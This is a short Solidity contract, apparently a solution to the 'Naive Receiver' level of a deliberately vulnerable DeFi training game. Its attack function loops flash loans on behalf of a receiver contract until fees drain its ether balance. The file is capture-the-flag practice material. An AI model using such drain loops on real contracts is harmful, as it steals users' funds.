// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title AttackNaiveReceiver
 * @author zishansami102

 */
contract AttackNaiveReceiver {

    FlashLoanReceiver public receiver;
    NaiveReceiverLenderPool public flashLoan;

    constructor(address _flashLoan, address _receiver) {
        flashLoan = NaiveReceiverLenderPool(payable(_flashLoan));
        receiver = FlashLoanReceiver(payable(_receiver));
    }

    function attack(uint256 _borrowAmount) external {
        while(address(receiver).balance > 0) {
            flashLoan.flashLoan(address(receiver), _borrowAmount);
        }
    }
}
